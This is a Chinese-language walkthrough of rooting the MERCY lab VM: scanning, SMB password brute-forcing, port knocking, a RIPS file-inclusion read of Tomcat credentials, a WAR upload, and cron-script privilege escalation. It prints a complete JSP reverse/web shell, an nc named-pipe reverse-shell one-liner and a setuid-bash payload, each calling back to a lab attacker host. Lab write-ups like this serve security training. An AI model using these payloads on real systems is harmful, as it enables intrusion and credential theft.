# 信息搜集

## 端口扫描

```bash
└─# nmap -A -sVC -O -p- 192.168.2.6 -oA nmap.txt
```

发现有 smb 服务，邮件服务， 8080 的 http，然而 80 和 22 端口 显示 filter，表示可能我们需要特定的顺序才能 敲开（knock） 这两个端口

```bash
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http
110/tcp  open     pop3?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imap    Dovecot imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
995/tcp  open     ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
MAC Address: 00:0C:29:D9:35:E2 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2h40m01s, deviation: 4h37m07s, median: -2s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-07-09T01:36:51
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2023-07-09T09:36:51+08:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

## 8080端口探测

tomcat 服务器

<img src=".\图片\Snipaste_2023-07-09_09-58-05.png" alt="Snipaste_2023-07-09_09-58-05" style="zoom:80%;" />

找到了一些敏感文件的位置

```
/var/lib/tomcat7/webapps/ROOT/index.html
/etc/tomcat7/tomcat-users.xml
/usr/share/tomcat7
.....
```

在 robots.txt 里找到文件，base64解码为

```
It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
```

大概就是说有一个员工喜欢把 `password` 作为密码

## smb探测

1、通过smbclient命令列出目标靶机中可用的Samba服务共享名

```bash
└─# smbclient -NL  192.168.2.6 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	qiu             Disk      
	IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
```

2、enum4linux枚举Samba账号

```bash
└─# enum4linux 192.168.2.6 | tee mercysmb.txt
```

并把收集到的用户名作为字典

```bash
└─# cat username.list 
pleadformercy
qiu
thisisasuperduperlonguser
fluffy
```

3、根据上文收集到的用户名，尝试爆破 smb 的 密码

```bash
└─# hydra -L username.list -P/usr/share/wordlists/fasttrack.txt smb://192.168.2.6:139
```

```
[139][smb] host: 192.168.2.6   login: qiu   password: password
```

找到一个用户名密码，`qiu/password`，也可以根据上文中 8080 端口 的信息搜集，推测出密码可能为 `password`

4、smbclient登录

```bash
└─# smbclient \\\\192.168.2.6\\qiu -U qiu
Password for [WORKGROUP\qiu]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug 31 15:07:00 2018
  ..                                  D        0  Mon Nov 19 11:59:09 2018
  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018
  .public                            DH        0  Sun Aug 26 10:23:24 2018
  .bash_history                       H      163  Fri Aug 31 15:11:34 2018
  .cache                             DH        0  Fri Aug 31 14:22:05 2018
  .private                           DH        0  Sun Aug 26 12:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018
  .profile                            H      675  Sun Aug 26 09:19:34 2018
```

get 命令 把 关键文件下载到本地，再找到了关键文件 config，发现可能是 knock 敲开端口的规则

```
[openHTTP]
	sequence    = 159,27391,4
	seq_timeout = 100
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
	tcpflags    = syn

[closeHTTP]
	sequence    = 4,27391,159
	seq_timeout = 100
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
	tcpflags    = syn

[openSSH]
	sequence    = 17301,28504,9999
	seq_timeout = 100
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9999,28504,17301
	seq_timeout = 100
	command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```

## knock敲开端口

此时可以些脚本敲开，也可以下载 knock 命令 和 用 nc 敲开

knockhttp.sh

```sh
#!/bin/bash

for PORT in 159 27391 4;do nmap -Pn 192.168.2.6  -p  $PORT;

done
```

knockssh.sh

```bash
#!/bin/bash

for PORT in 17301 28504 9999;do nmap -Pn 192.168.2.6  -p  $PORT;

done
```

运行脚本后发现 22 和 80 端口都开放了

```bash
└─# nmap -p80,22 192.168.2.6   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 22:13 EDT
Nmap scan report for 192.168.2.6 (192.168.2.6)
Host is up (0.00037s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

# 80端口探测

在 http://192.168.2.6/robots.txt

里找到了关键 组件  `RIPS 0.53`

<img src=".\图片\Snipaste_2023-07-09_10-21-03.png" alt="Snipaste_2023-07-09_10-21-03" style="zoom:80%;" />

寻找 RIPS 0.53 已知漏洞，然后利用

发现是个文件包含

```
http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd
```

```http
http://192.168.2.6/nomercy/windows/code.php?file=../../../../../../etc/passwd
```

此时可以试试读取敏感文件（最好包含账号密码啥的），就试试之前 8080 端口 搜集到的 tomcat 配置文件 信息

```http
http://192.168.2.6/nomercy/windows/code.php?file=/etc/tomcat7/tomcat-users.xml
```

得到账号密码，可能是 tomcat manager里的，也可能用 ssh 登录

```
<? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
<? <user username="fluffy" password="freakishfluffybunny" roles="none"/> 
```

```
thisisasuperduperlonguser:heartbreakisinevitable
fluffy:freakishfluffybunny
```

# Tomcat后台拿shell

补充下，像如下认证，是在请求头里 用 `username:password` 这种格式再用 base64 编码后的数据传输的。如果爆破的话，在 kali 里有特定的字典 ，seclists 里 的 password 里有特定编码好的字典

<img src=".\图片\Snipaste_2023-07-09_10-30-27.png" alt="Snipaste_2023-07-09_10-30-27" style="zoom:80%;" />

我们这里不用字典，拿到了账号密码直接登录即可

<img src=".\图片\Snipaste_2023-07-09_10-34-47.png" alt="Snipaste_2023-07-09_10-34-47" style="zoom:80%;" />

接下来是上传一个 jsp 反弹 shell 的 war 包，访问触发再监听即可

shell.jsp 为：

```jsp
<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%
    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}
    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;
        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;
        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }
        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    try {
        Socket socket = new Socket( "192.168.2.7", 1234 ); // Replace with wanted ip and port
        Process process = Runtime.getRuntime().exec( shellPath );
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        out.println("port opened on " + socket);
     } catch( Exception e ) {}
%>
</pre>
</body>
</html>
```

打包命令为：

```bash
jar -cf shell.war shell.jsp
```

触发路径为

```http
http://192.168.2.6:8080/shell/shell.jsp
```

监听拿到shell

```
└─# nc -lvvp 1234
python -c 'import pty; pty.spawn("/bin/bash")'
```

# 提权

**1、之前还收集到了一个账号密码，试试 su**

```
fluffy:freakishfluffybunny
```

```bash
tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
su fluffy
Password: freakishfluffybunny

Added user fluffy.

$ whoami
whoami
fluffy

```

**2、找 home 目录下的关键信息**

```bash
ls
fluffy	pleadformercy  qiu  thisisasuperduperlonguser
```

```bash
ls -al /home/fluffy/.private/secrets/timeclock
-rwxrwxrwx 1 root root 222 Nov 20  2018 /home/fluffy/.private/secrets/timeclock
```

看 timeclock 的权限，buff叠满了。再看看内容

```bash
fluffy@MERCY:~/.private/secrets$ cat timeclock
cat timeclock
#!/bin/bash

now=$(date)
echo "The system time is: $now." > ../../../../../var/www/html/time
echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
```

**3、顺从其内容看看**

```bash
fluffy@MERCY:~/.private/secrets$ cat ../../../../../var/www/html/time
cat ../../../../../var/www/html/time
The system time is: Sun Jul  9 10:57:01 +08 2023.
Time check courtesy of LINUX
```

这个显示了当前的日期时间，可能是个计划任务

**4、提权**

这时候可以写反弹shell

```bash
fluffy@MERCY:~/.private/secrets$ echo "rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc 192.168.2.7 8888 1>/tmp/p" >> timeclock
<</tmp/p | nc 192.168.9.7 8888 1>/tmp/p" >> timeclock                        
fluffy@MERCY:~/.private/secrets$ 
```

也可以把 /bin/bash 加上 s 为权限

s权限的作用：表示对文件具用可执行权限的用户将使用文件拥有者的权限或文件拥有者所在组的权限在对文件进行执行。

[linux 文件 s 权限 - _H0f - 博客园 (cnblogs.com)](https://www.cnblogs.com/someone9/p/8551010.html#:~:text=s权限的作用：表示对文件具用可执行权限的用户将使用文件拥有者的权限或文件拥有者所在组的权限在对文件进行执行。 s权限的设置：4，用户拥有者的执行权限位， 6，用户组的执行权限位，,2， 两者都设置， 0， 两者都不设置。)

```
echo 'chmod +s /bin/bash' >> timeclock
```

```bash
fluffy@MERCY:~/.private/secrets$ ls -al /bin/bash
ls -al /bin/bash
-rwsr-sr-x 1 root root 986672 May 16  2017 /bin/bash
fluffy@MERCY:~/.private/secrets$ /bin/bash -p
/bin/bash -p
```



```bash
bash-4.3# cat p*
cat p*
Congratulations on rooting MERCY. :-)
```



# 总结

knock敲端口

smb探测 smbclient ，成功登录后，可查看共享目录里的文件信息

文件包含，读取网站的配置文件

tomcat 后台上传 war


